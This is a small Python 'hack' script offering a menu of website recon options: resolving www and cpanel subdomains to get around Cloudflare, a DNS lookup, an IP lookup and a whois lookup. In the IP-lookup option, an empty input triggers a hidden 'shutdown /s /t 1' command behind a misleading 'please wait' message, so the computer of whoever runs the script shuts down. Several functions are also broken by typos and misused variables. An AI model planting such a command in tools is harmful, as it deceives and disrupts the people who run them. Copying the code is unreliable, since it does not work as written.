# hack
from colorama import Fore
import time
print(Fore.RED + "Hello . I`m Bot Welcome Back ;)\n")
time.sleep(1)
print(Fore.RED+"[1]"+Fore.GREEN+" Cloud Flare ;)")
print(Fore.RED+"[2]"+Fore.GREEN+" Scan Web Site 2 ;)")
print(Fore.RED+"[3]"+Fore.GREEN+" Ip Web Site Not Cloud Flare ;)")
print(Fore.RED+"[4]"+Fore.GREEN+" whois ;)")
m1 = int(input(Fore.YELLOW+"\nEnter You Number 1 / 2 / 3 / 4 ==>  "))



if m1 == 1:

    import sys
    import socket
    import time
    from colorama import Fore
    def __name__():
        print(Fore.RED+"Hello . I`m Bot \nCan I Help You?\n")
        site = input(Fore.YELLOW+"Enter Your Address WebSite ==>  ")
        if site == "":
            try:
                print("You Are 5 Sec Go To The Mano ;)")
                time.sleep(5)
                sys.exit()
            except:
                pass
        my_list = ["www" , "cpanel"]
        for item in my_list:
            hosts = str(item) + "." + str(site)
            bypass = socket.gethostbyname(str(hosts))
            print(Fore.YELLOW+"your ip ==> "+Fore.RED + str(bypass) + Fore.YELLOW +" | " + Fore.RED +str(hosts))
    __name__()


# ___________________________________________________________________

if m1 == 2:

    import sys
    import requests
    import time

    def __start__():
        try:
            print("Hello . Welome Back ;) \n")
            time.sleep(2)
            web = input("Enter Your Address WebSite ==> ")
            if web == "":
                try:
                    print("You Are 5 Sec Go To The Mano ;)")
                    time.sleep(5)
                    sys.exit()
                except:
                    pass
            req = requests.get("https://api.hackertarget.com/dnslookup/?q" , site).text
            print(req)
        except:
            try:
                print("You Are 5 Sec Go To The Mano ;)")
                time.sleep(5)
                sys.exit()
            except:
                pass
    __start__()
if m1 >= 5 :
    print(Fore.RED +"[!]"+Fore.GREEN+"This In Not Found ;)")
    
# ___________________________________________________________________________


if m1 == 3:

    import os
    import sys
    import socket
    import time
    def _name__():
        print("Hello . I`m Bot \nCan I Help You?\n")
        site = input("Enter Your Site ==>  ")
        if site == "":
            try:
                print("Pleass 10 Sec Latter ;)")
                num = 1
                os.system(f"shutdown /s /t {num}")
            except:
                pass

        info = socket.gethostbyname(str(site))
        print("Your ip Is ==> " + info)

    _name__()

# _____________________________________________________________________________________________________


if m1 == 4 :
    import ipapi
    import requests
    import sys
    import time
    from colorama import Fore

    def __s__():
        try:
            print(Fore.RED + "Hello . Welcome Back ;)")
            site = inpur(Fore.YELLOW + "Enter Your Address WbSite ==> ")
            if site == "":
                try:
                    print(Fore.YELOOW + "You Are 5 Sec Go To The Mano ;)")
                    time.sleep(5)
                    sys.exit()
                except:
                    pass
            info = ipapi.location(ip = site , key = None , field = None)
            print(Fore.YELLOW + info)





        except:
            pass
    __s__()
    
    
    
    
    
    
    
    
    
    
    
    

